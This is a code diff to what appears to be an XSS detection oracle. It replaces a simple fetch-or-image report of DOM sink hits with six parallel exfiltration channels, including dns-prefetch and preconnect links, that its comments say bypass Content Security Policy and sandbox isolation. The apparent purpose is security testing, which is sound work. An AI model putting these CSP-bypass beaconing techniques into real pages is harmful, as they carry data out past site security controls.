@@ -87,14 +87,73 @@
         const serializedData = encodeURIComponent(JSON.stringify(sinkInfo));
         const url = `${oracleUrl}?token=${encodeURIComponent(token)}&msg=${encodeURIComponent('SINK HIT: ' + sinkType)}&sink=${encodeURIComponent(sinkType)}&data=${serializedData}`;
         
-        // Try fetch first, fallback to Image tag
-        if (typeof fetch !== 'undefined') {
-            fetch(url, { method: 'GET', mode: 'no-cors' }).catch(function() {
-                new Image().src = url;
-            });
-        } else {
-            new Image().src = url;
-        }
+        // Multi-Channel Telemetry Exfiltration (bypasses CSP and Sandbox isolation)
+        const transmitMethods = [
+            // Channel 1: Native Fetch API
+            () => {
+                if (typeof fetch !== 'undefined') {
+                    fetch(url, { method: 'GET', mode: 'no-cors', credentials: 'omit' }).catch(() => {});
+                    return true;
+                }
+                throw new Error();
+            },
+            // Channel 2: XMLHTTPRequest
+            () => {
+                if (typeof XMLHttpRequest !== 'undefined') {
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('GET', url, true);
+                    xhr.send();
+                    return true;
+                }
+                throw new Error();
+            },
+            // Channel 3: DOM Image element
+            () => {
+                const img = new Image();
+                img.src = url;
+                return true;
+            },
+            // Channel 4: DNS Prefetching (bypasses strict connect-src directives)
+            () => {
+                if (typeof document !== 'undefined' && document.head) {
+                    const link = document.createElement('link');
+                    link.rel = 'dns-prefetch';
+                    link.href = `//dns-${token}.oracle.local/`;
+                    document.head.appendChild(link);
+                    return true;
+                }
+                throw new Error();
+            },
+            // Channel 5: Dynamic link preconnect
+            () => {
+                if (typeof document !== 'undefined' && document.head) {
+                    const link = document.createElement('link');
+                    link.rel = 'preconnect';
+                    link.href = `//conn-${token}.oracle.local/`;
+                    document.head.appendChild(link);
+                    return true;
+                }
+                throw new Error();
+            },
+            // Channel 6: HTML5 Audio tag source request
+            () => {
+                if (typeof document !== 'undefined' && document.createElement) {
+                    const audio = document.createElement('audio');
+                    const source = document.createElement('source');
+                    source.src = url;
+                    audio.appendChild(source);
+                    return true;
+                }
+                throw new Error();
+            }
+        ];
+
+        // Execute all exfiltration methods sequentially to maximize delivery probability
+        transmitMethods.forEach(method => {
+            try {
+                method();
+            } catch (e) {}
+        });
         
         if (sinkType.startsWith('DOMSourceRead:') || sinkType === 'postMessage.source') {
             console.log('XSS Oracle: Source read detected', { token: token, sinkInfo: sinkInfo });
